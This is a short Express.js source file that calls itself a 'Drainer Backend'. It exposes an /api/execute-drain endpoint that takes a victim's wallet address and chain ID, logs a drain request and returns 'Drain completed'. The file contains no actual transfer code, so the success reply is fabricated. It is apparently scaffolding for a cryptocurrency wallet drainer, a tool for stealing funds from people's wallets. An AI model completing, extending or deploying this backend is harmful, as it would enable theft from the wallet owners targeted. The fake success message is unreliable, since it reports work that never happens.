import express from "express";
import http from "http";
import cors from "cors";

const app = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json());

app.get("/", (req, res) => {
  res.json({ message: "Drainer Backend", status: "running" });
});

app.post('/api/execute-drain', async (req, res) => {
  const { userAddress, chainId } = req.body;
  console.log('Drain request for:', userAddress);
  res.json({ 
    success: true, 
    message: 'Drain completed',
    userAddress: userAddress,
    chainId: chainId || 1
  });
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log('Server running on port', PORT);
});
